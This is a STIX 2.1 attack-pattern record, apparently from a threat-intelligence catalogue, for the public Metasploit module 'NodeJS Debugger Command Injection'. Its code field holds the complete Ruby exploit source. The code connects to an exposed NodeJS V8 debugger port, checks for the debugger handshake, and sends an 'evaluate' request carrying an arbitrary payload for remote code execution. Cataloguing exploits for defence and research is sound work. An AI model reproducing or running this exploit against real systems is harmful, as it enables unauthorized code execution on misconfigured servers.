{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7637828a-9cd0-4d4d-990a-65d4321a682d",
    "created": "2024-08-14T17:06:33.357939Z",
    "modified": "2024-08-14T17:06:33.357943Z",
    "name": "\"NodeJS Debugger Command Injection\"",
    "description": " This module uses the \"evaluate\" request type of the NodeJS V8 debugger protocol (version 1) to evaluate arbitrary JS and call out to other system commands. The port (default 5858) is not exposed non-locally in default configurations, but may be exposed either intentionally or via misconfiguration.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/nodejs_v8_debugger.rb",
            "external_id": "nodejs_v8_debugger.rb"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/buggerjs/bugger-v8-client/blob/master/PROTOCOL.md"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/nodejs/node/pull/8106"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  MESSAGE_HEADER_TEMPLATE   = \"Content-Length: %{length}\\r\\n\\r\\n\"\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"NodeJS Debugger Command Injection\",\n      'Description'    => %q{\n        This module uses the \"evaluate\" request type of the NodeJS V8\n        debugger protocol (version 1) to evaluate arbitrary JS and\n         call out to other system commands. The port (default 5858) is\n        not exposed non-locally in default configurations, but may be\n        exposed either intentionally or via misconfiguration.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'Patrick Thomas <pst[at]coffeetocode.net>' ],\n      'References'     =>\n        [\n          [ 'URL', 'https://github.com/buggerjs/bugger-v8-client/blob/master/PROTOCOL.md' ],\n          [ 'URL', 'https://github.com/nodejs/node/pull/8106' ]\n        ],\n      'Targets'        =>\n        [\n          ['NodeJS', { 'Platform' => 'nodejs', 'Arch' => 'nodejs' } ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2016-08-15',\n      'DefaultTarget'  => 0)\n    )\n\n    register_options(\n      [\n        Opt::RPORT(5858)\n      ])\n  end\n\n  def make_eval_message\n    msg_body = { seq: 1,\n                 type: 'request',\n                 command: 'evaluate',\n                 arguments: { expression: payload.encoded,\n                              global: true,\n                              maxStringLength:-1\n                            }\n                }.to_json\n    msg_header = MESSAGE_HEADER_TEMPLATE % {:length => msg_body.length}\n    msg_header + msg_body\n  end\n\n  def check\n    connect\n    res = sock.get_once\n    disconnect\n\n    if res.include? \"V8-Version\" and res.include? \"Protocol-Version: 1\"\n      vprint_status(\"Got debugger handshake:\\n#{res}\")\n      return Exploit::CheckCode::Appears\n    end\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    connect\n    # must consume incoming handshake before sending payload\n    buf = sock.get_once\n    msg = make_eval_message\n    print_status(\"Sending #{msg.length} byte payload...\")\n    vprint_status(\"#{msg}\")\n    sock.put(msg)\n    buf = sock.get_once\n\n    if buf.include? '\"command\":\"evaluate\",\"success\":true'\n      print_status(\"Got success response\")\n    elsif buf.include? '\"command\":\"evaluate\",\"success\":false'\n      print_error(\"Got failure response: #{buf}\")\n    else\n      print_error(\"Got unexpected response: #{buf}\")\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2016-08-15"
}